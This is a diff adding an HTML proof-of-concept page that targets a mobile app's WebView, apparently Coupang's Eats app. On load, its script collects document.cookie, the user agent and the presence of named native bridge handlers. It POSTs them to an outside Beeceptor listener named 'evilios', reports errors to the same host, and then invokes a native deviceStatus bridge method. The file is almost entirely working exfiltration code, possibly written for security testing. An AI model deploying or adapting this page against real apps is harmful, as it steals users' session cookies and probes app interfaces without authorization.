@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Validation PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; color: #333; text-align: center; }
+        .status-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: inline-block; margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+    <div class="status-box">
+        <h2>Verification Page Loaded</h2>
+        <p>Analyzing WebView environment and transmitting findings...</p>
+        <p id="status-text" style="color: #666;">Initializing exfiltration...</p>
+    </div>
+
+    <script>
+        const BEECEPTOR_ENDPOINT = "https://evilios.free.beeceptor.com";
+
+        window.onload = function() {
+            // 1. Gather client-side accessible data
+            const payload = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                cookies: document.cookie || "No document.cookie accessible",
+                interfacesDetected: {
+                    messageHandlers: typeof window.messageHandlers !== 'undefined',
+                    eatsPopupWebViewHandlers: typeof window.eatsPopupWebViewHandlers !== 'undefined',
+                    eatsWebEventHandlers: typeof window.eatsWebEventHandlers !== 'undefined',
+                    eatsWebTrackingHandlers: typeof window.eatsWebTrackingHandlers !== 'undefined',
+                    CoupangAppTracking: typeof window.CoupangAppTracking !== 'undefined'
+                }
+            };
+
+            // 2. Transmit gathered data to your Beeceptor listener
+            fetch(BEECEPTOR_ENDPOINT, {
+                method: "POST",
+                mode: "cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                document.getElementById('status-text').innerText = "Data sent to Beeceptor successfully.";
+                
+                // 3. Attempt a safe interface trigger to verify execution capabilities
+                triggerInterfaceVerification();
+            })
+            .catch(error => {
+                document.getElementById('status-text').innerText = "Transmission failed: " + error.message;
+            });
+        };
+
+        function triggerInterfaceVerification() {
+            if (typeof window.messageHandlers !== 'undefined' && typeof window.messageHandlers.deviceStatus === 'function') {
+                try {
+                    // Triggering a safe call to observe execution flow in logcat
+                    window.messageHandlers.deviceStatus("{}");
+                } catch (e) {
+                    // Send error details back to listener if invocation fails
+                    fetch(`${BEECEPTOR_ENDPOINT}/error`, {
+                        method: "POST",
+                        body: JSON.stringify({ error: e.message })
+                    });
+                }
+            }
+        }
+    </script>
+</body>
+</html>
